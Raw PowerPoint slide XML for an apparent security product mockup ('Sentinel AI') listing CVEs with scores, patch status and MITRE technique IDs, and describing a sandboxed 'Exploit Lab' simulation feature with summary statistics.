            <a:ext cx="1197864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92608" y="4983480"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2024-0985</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4983480"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="4983480"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15.3%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="4983480"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="4983480"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="4983480"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1611</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="4983480"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH — PostgreSQL low-priv user escalates to superuser via ALTER TABLE SET SCHEMA exploit.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Rectangle 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5184648"/>
            <a:ext cx="1197864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92608" y="5221224"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-32149</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="5221224"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="5221224"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>18.9%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="5221224"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="5221224"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PATCHED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="TextBox 105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="5221224"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1499</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="TextBox 106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="5221224"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MEDIUM — Grafana auth bypass. Merged patch on branch sentinel/fix/CVE-2022-32149. Re-sim: blocked.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Rectangle 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5422392"/>
            <a:ext cx="1197864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92608" y="5458968"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-28154</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="TextBox 109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="5458968"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.7</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="TextBox 110"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="5458968"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>32.4%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="TextBox 111"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="5458968"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="TextBox 112"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="5458968"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PATCHED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="TextBox 113"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="5458968"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1083 · T1005</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="TextBox 114"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="5458968"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HIGH — GitLab path traversal exposes CI/CD secrets. Merged. Re-sim: exploit failed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Rectangle 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6144768"/>
            <a:ext cx="11731752" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051218"/>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365760" y="6236208"/>
            <a:ext cx="11457432" cy="338328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Filter bar: Severity (All/Critical/High/Medium/Low) · Status (Open/In Progress/Patched/Verified) · Exploitable-only toggle (hides CVEs with no confirmed exploit) · Free-text search across CVE ID and blast radius · Environment tag filter. Clicking any row opens the CVE detail page with full NVD vector, CWE list, vendor advisory link, MITRE technique detail, and the patch recommendation from Sentinel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Exploit Lab</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Sandboxed AI exploit simulation — prove exploitability, verify patches, and map MITRE ATT&amp;CK coverage</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Exploit Lab is Sentinel AI's most powerful capability. Instead of relying on vulnerability scanners that simply report CVEs, the Exploit Lab actually attempts to exploit them — inside a fully isolated sandbox that cannot affect production systems. The AI engine selects the appropriate exploit module for each CVE, constructs the payload, executes the attack chain against a cloned container, and records the outcome: whether the exploit succeeded or was blocked, the confidence score (how certain the engine is of the result), duration, and the full terminal output log. This transforms vulnerability management from theoretical risk into empirical evidence. A CVE that the exploit engine cannot successfully trigger is far lower priority than one it breaks in under two seconds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="2286000" cy="777240"/>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28600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40280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Total Simulations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2706624"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Logistics seeded</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2148840"/>
            <a:ext cx="2286000" cy="777240"/>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604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240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploited</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2706624"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>67% success rate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2148840"/>
            <a:ext cx="2286000" cy="77724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2148840"/>
            <a:ext cx="228600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3208" y="2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Blocked</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2706624"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Defence held</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2148840"/>
            <a:ext cx="2286000" cy="777240"/>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2148840"/>
            <a:ext cx="228600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2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Avg Confidence</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>71%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2706624"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
